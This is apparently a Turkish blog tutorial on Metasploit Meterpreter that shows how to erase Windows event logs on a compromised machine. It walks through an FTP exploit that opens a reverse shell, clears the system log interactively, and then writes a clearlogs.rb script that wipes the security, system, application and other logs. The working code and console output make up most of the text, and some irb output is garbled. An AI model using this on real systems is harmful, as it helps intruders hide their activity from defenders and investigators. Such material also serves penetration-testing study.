---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:21:00Z"
excerpt: Bazen hedef bilgisayarda yaptığınız işlemlerin log kayıtlarını temizlemek
  isteyebilirsiniz. Bu temizleme işlemi için öncelikle meterpreter in sağladığı winenum script
  kodlarının nasıl çalıştığına bakalım. Script dosyasını Metasploit Framework klasörünüzün
  altında /usr/share/metasploit-framework/scripts/meterpreter/winenum.rb adresinde
  bulabilirsiniz. Bu dosya içerisinde bir çok bölüm bulunmaktadır. Biz şimdilik sadece #
  Function for clearing all event logs kısmıyla ilgileneceğiz.
guid: https://www.siberoloji.com/?p=1181
id: 1181
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Log Yönetimi
url: /tr/msf-log-yonetimi/
---

  Bazen hedef bilgisayarda yaptığınız işlemlerin log kayıtlarını temizlemek isteyebilirsiniz. Bu temizleme işlemi için öncelikle meterpreter in sağladığı&nbsp;<code>winenum</code>&nbsp;script kodlarının nasıl çalıştığına bakalım. Script dosyasını Metasploit Framework klasörünüzün altında&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter/winenum.rb</code>&nbsp;adresinde bulabilirsiniz. Bu dosya içerisinde bir çok bölüm bulunmaktadır. Biz şimdilik sadece&nbsp;<code># Function for clearing all event logs</code>&nbsp;kısmıyla ilgileneceğiz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><em># Function for clearing all event logs</em>
def clrevtlgs<strong>()</strong>
  evtlogs <strong>=</strong> <strong>[</strong>
    'security',
    'system',
    'application',
    'directory service',
    'dns server',
    'file replication service'
  <strong>]</strong>
  print_status<strong>(</strong>"Clearing Event Logs, this will leave and event 517"<strong>)</strong>
  begin
    evtlogs.each <strong>do</strong> |evl|
      print_status<strong>(</strong>"\tClearing the #{evl} Event Log"<strong>)</strong>
      log <strong>=</strong> @client.sys.eventlog.open<strong>(</strong>evl<strong>)</strong>
      log.clear
      file_local_write<strong>(</strong>@dest,"Cleared the #{evl} Event Log"<strong>)</strong>
    end
    print_status<strong>(</strong>"All Event Logs have been cleared"<strong>)</strong>
  rescue ::Exception <strong>=&gt;</strong> e
    print_status<strong>(</strong>"Error clearing Event Log: #{e.class} #{e}"<strong>)</strong>

  end
end
</code></pre>
<!-- /wp:code -->

  Programlama ile ilgilenenler kodları ve fonksiyonun nasıl çalıştığını rahatlıkla anlayacaktır. Yukarıdaki kodların ne işe yaradığını özetle açıklayalım.&nbsp;<code>evtlogs.each do |evl|</code>&nbsp;döngüsü, Windows’a ait ‘security’, ‘system’, ‘application’, ‘directory service’, ‘dns server’ ve ‘file replication service’ loglarını sırasıyla açar ve temizler.</p>
 

  Şimdi, hazır script yerine yukarıdaki dosyadan örnek alarak kendi script kodumuzu oluşturalım ve kaydedelim. Bunun için Meterpreter içnde Ruby kodlamayı kullanacağız. Temizlikten önce Windows Log durumunu aşağıdaki resimden görebilirsiniz.</p>
 

<!-- wp:image {"id":1001,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/assets/images/2024/06/Eventlog-00.png" alt="" class="wp-image-1001" /></figure>
<!-- /wp:image -->

  Biz sadece ‘system’ loglarını temizlemek istediğimizden yukarıdaki döngü içerisinden sadece&nbsp;<code>log = client.sys.eventlog.open(‘system’)</code>&nbsp;durumunu kullanacağız.</p>
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="bu-kısımda-deneme-yapıyoruz">Bu kısımda deneme yapıyoruz 
<!-- /wp:heading -->

  Öncelikle hedef bilgisayarda bir meterpreter shell açmış olmalıyız.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>warftpd_165_user<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to FTP server 172.16.104.145:21...
<strong>[</strong><strong>*</strong><strong>]</strong> Connected to target FTP server.
<strong>[</strong><strong>*</strong><strong>]</strong> Trying target Windows 2000 SP0-SP4 English...
<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 2 opened <strong>(</strong>172.16.104.130:4444 -&gt; 172.16.104.145:1246<strong>)</strong>
</code></pre>
<!-- /wp:code -->

  Ardından meterpreter shell içerisinden Ruby kodlayıcısını&nbsp;<code>irb</code>&nbsp;komutuyla çalıştırıyoruz ve aşağıdaki kodları yapıştırıyoruz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> irb
<strong>[</strong><strong>*</strong><strong>]</strong> Starting IRB shell
<strong>[</strong><strong>*</strong><strong>]</strong> The 'client' variable holds the meterpreter client
<strong>&gt;&gt;</strong> log <strong>=</strong> client.sys.eventlog.open<strong>(</strong>'system'<strong>)</strong>
<strong>=&gt;</strong> <em>#&gt;#:0xb6779424 @client=#&gt;, #&gt;, #</em>

"windows/browser/facebook_extractiptc"<strong>=&gt;</strong><em>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#</em>
</code></pre>
<!-- /wp:code -->

  Şimdi, meterpreter içerisinde&nbsp;<code>log.clear</code>&nbsp;komutuyla logların temizlenip temizlenmediğini kontrol edelim.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>&gt;&gt;</strong> log.clear
<strong>=&gt;</strong> <em>#&gt;#:0xb6779424 @client=#&gt;,</em>

/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1002,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/assets/images/2024/06/Eventlog-01.png" alt="" class="wp-image-1002" /></figure>
<!-- /wp:image -->

  Meterpreter içerisinde Ruby kodlayıcısı kullanarak basit bir log temizleme denemesi yaptık ve yaptığımız kontrolde başarılı olduk. Bu yaklaşımı kullanarak kendi Script kodlarımızı yazabiliriz.</p>
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="tüm-logları-temizleme">Tüm Logları Temizleme 
<!-- /wp:heading -->

  Aşağıdaki kodları bir dosyaya yazarak&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter/</code>&nbsp;klasörüne&nbsp;<code>clearlogs.rb</code>&nbsp;adıyla kaydedin.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">evtlogs <strong>=</strong> <strong>[</strong>
        'security',
        'system',
        'application',
        'directory service',
        'dns server',
        'file replication service'
        <strong>]</strong>
print_line<strong>(</strong>"Clearing Event Logs, this will leave an event 517"<strong>)</strong>
evtlogs.each <strong>do</strong> |evl|
        print_status<strong>(</strong>"Clearing the #{evl} Event Log"<strong>)</strong>
        log <strong>=</strong> client.sys.eventlog.open<strong>(</strong>evl<strong>)</strong>
        log.clear
end
print_line<strong>(</strong>"All Clear! You are a Ninja!"<strong>)</strong>
</code></pre>
<!-- /wp:code -->

  Artık bu yeni oluşturduğunuz Script kodlarını yeni açtığınız Meterpreter oturumlarında çalıştırabilirsiniz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>warftpd_165_user<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to FTP server 172.16.104.145:21...
<strong>[</strong><strong>*</strong><strong>]</strong> Connected to target FTP server.
<strong>[</strong><strong>*</strong><strong>]</strong> Trying target Windows 2000 SP0-SP4 English...
<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 1 opened <strong>(</strong>172.16.104.130:4444 -&gt; 172.16.104.145:1253<strong>)</strong>

meterpreter <strong>&gt;</strong> run clearlogs
Clearing Event Logs, this will leave an event 517
<strong>[</strong><strong>*</strong><strong>]</strong> Clearing the security Event Log
<strong>[</strong><strong>*</strong><strong>]</strong> Clearing the system Event Log
<strong>[</strong><strong>*</strong><strong>]</strong> Clearing the application Event Log
<strong>[</strong><strong>*</strong><strong>]</strong> Clearing the directory service Event Log
<strong>[</strong><strong>*</strong><strong>]</strong> Clearing the dns server Event Log
<strong>[</strong><strong>*</strong><strong>]</strong> Clearing the file replication service Event Log
All Clear! You are a Ninja!
meterpreter <strong>&gt;</strong> exit
</code></pre>
<!-- /wp:code -->

  Aşağıdaki resimde görüldüğü gibi tüm loglar temizlenmiştir. Geriye sadece 517 numaralı işlem kalmıştır. O işlemde halen meterpreter’in çalıştığı proses olduğundan halen aktif durumdadır.</p>
 

<!-- wp:image {"id":1003,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/assets/images/2024/06/Eventlog-03.png" alt="" class="wp-image-1003" /></figure>
<!-- /wp:image -->

  Bu yazıda, Metasploit Framework içerisinde bulunan Scriptleri örnek alarak kendi script dosyamızı yazmayı ve log temizlemeyi göstermeye çalıştık.&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter/</code>&nbsp;klasöründe bulunan diğer script dosyalarını da incelemenizi tavsiye ediyoruz. Bu sayede elinizdeki imkanları da öğrenmiş olacaksınız.</p>
 